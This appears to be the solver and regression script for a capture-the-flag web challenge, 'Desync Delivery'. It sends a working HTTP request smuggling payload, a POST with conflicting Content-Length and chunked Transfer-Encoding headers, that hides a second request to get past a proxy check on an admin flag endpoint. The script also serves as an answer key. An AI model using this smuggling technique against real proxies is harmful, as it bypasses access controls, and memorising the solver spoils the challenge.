#!/usr/bin/env python3
"""End-to-end solver/regression check for Desync Delivery."""

from __future__ import annotations

import re
import socket
import ssl
import sys
from io import BytesIO
from urllib.parse import urlsplit


def read_response(reader):
    status_line = reader.readline()
    if not status_line:
        raise RuntimeError("server closed before sending a response")
    if not status_line.endswith(b"\r\n"):
        raise RuntimeError("malformed response status line")
    try:
        version, status, reason = status_line[:-2].decode("latin-1").split(" ", 2)
    except ValueError as exc:
        raise RuntimeError(f"malformed response: {status_line!r}") from exc
    if version != "HTTP/1.1":
        raise RuntimeError(f"unexpected protocol version {version}")

    headers = {}
    while True:
        line = reader.readline()
        if not line or not line.endswith(b"\r\n"):
            raise RuntimeError("malformed response headers")
        if line == b"\r\n":
            break
        name, separator, value = line[:-2].partition(b":")
        if not separator:
            raise RuntimeError("malformed response header")
        headers[name.lower()] = value.strip()

    length = int(headers.get(b"content-length", b"0"))
    body = reader.read(length)
    if len(body) != length:
        raise RuntimeError("truncated response body")
    return int(status), reason, body


def request(host: str, port: int, wire: bytes, response_count: int, use_tls: bool = False):
    connection = socket.create_connection((host, port), timeout=5)
    if use_tls:
        context = ssl.create_default_context()
        context.set_alpn_protocols(["http/1.1"])
        connection = context.wrap_socket(connection, server_hostname=host)
    with connection as sock:
        sock.settimeout(5)
        sock.sendall(wire)
        reader = sock.makefile("rb")
        return [read_response(reader) for _ in range(response_count)]


def parse_response_stream(wire: bytes, response_count: int):
    reader = BytesIO(wire)
    responses = [read_response(reader) for _ in range(response_count)]
    if reader.read(1):
        raise RuntimeError("unexpected bytes after inner response stream")
    return responses


def main() -> int:
    endpoint = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    parsed = urlsplit(endpoint)
    if parsed.scheme:
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            raise SystemExit("endpoint must be a host or an http(s) URL")
        host = parsed.hostname
        use_tls = parsed.scheme == "https"
        port = parsed.port or (443 if use_tls else 80)
    else:
        host = endpoint
        use_tls = False
        port = 8080
    if len(sys.argv) > 2:
        port = int(sys.argv[2])
    if len(sys.argv) > 3:
        raise SystemExit("usage: solve.py [host|http(s)://URL] [port]")

    landing = request(
        host,
        port,
        b"GET / HTTP/1.1\r\n"
        + f"Host: {host}:{port}\r\nConnection: close\r\n\r\n".encode("ascii"),
        1,
        use_tls,
    )[0]
    if landing[0] != 200 or b"Desync Delivery" not in landing[2]:
        raise SystemExit("landing page smoke check failed")

    handoff = request(
        host,
        port,
        b"GET /handoff.txt HTTP/1.1\r\n"
        + f"Host: {host}:{port}\r\nConnection: close\r\n\r\n".encode("ascii"),
        1,
        use_tls,
    )[0]
    if handoff[0] != 200 or b"X-Proxy-Verified: 1" not in handoff[2] or b"/intake" not in handoff[2]:
        raise SystemExit("handoff hint smoke check failed")

    direct = request(
        host,
        port,
        b"GET /internal/admin/flag HTTP/1.1\r\n"
        + f"Host: {host}:{port}\r\nX-Proxy-Verified: 0\r\nConnection: close\r\n\r\n".encode("ascii"),
        1,
        use_tls,
    )
    if direct[0][0] != 403:
        raise SystemExit(f"expected direct request to return 403, received {direct[0][0]}")

    inner = (
        b"GET /internal/admin/flag HTTP/1.1\r\n"
        + f"Host: {host}:{port}\r\n\r\n".encode("ascii")
    )
    body = b"0\r\n\r\n" + inner
    outer = (
        b"POST / HTTP/1.1\r\n"
        + b"Host: depot.local\r\n"
        + f"Content-Length: {len(body)}\r\n".encode("ascii")
        + b"Transfer-Encoding: chunked\r\n"
        + b"Connection: keep-alive\r\n\r\n"
        + body
    )
    envelope = (
        b"POST /intake HTTP/1.1\r\n"
        + f"Host: {host}:{port}\r\n".encode("ascii")
        + b"Content-Type: application/octet-stream\r\n"
        + f"Content-Length: {len(outer)}\r\n".encode("ascii")
        + b"Connection: close\r\n\r\n"
        + outer
    )
    intake = request(host, port, envelope, 1, use_tls)[0]
    if intake[0] != 200:
        raise SystemExit(f"expected intake envelope to return 200, received {intake[0]}")
    responses = parse_response_stream(intake[2], 2)
    if responses[0][0] != 200:
        raise SystemExit(f"expected outer request to return 200, received {responses[0][0]}")
    if responses[1][0] != 200 or not re.fullmatch(rb"wctf\{[0-9a-f]{32}\}\n", responses[1][2]):
        raise SystemExit(f"expected smuggled flag response, received {responses[1][0]}")

    print(f"Direct admin request: {direct[0][0]} {direct[0][1]}")
    print(f"Intake envelope:       {intake[0]} {intake[1]}")
    print(f"Outer request:         {responses[0][0]} {responses[0][1]}")
    print(f"Smuggled request:      {responses[1][0]} {responses[1][1]}")
    print(responses[1][2].decode("ascii").strip())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
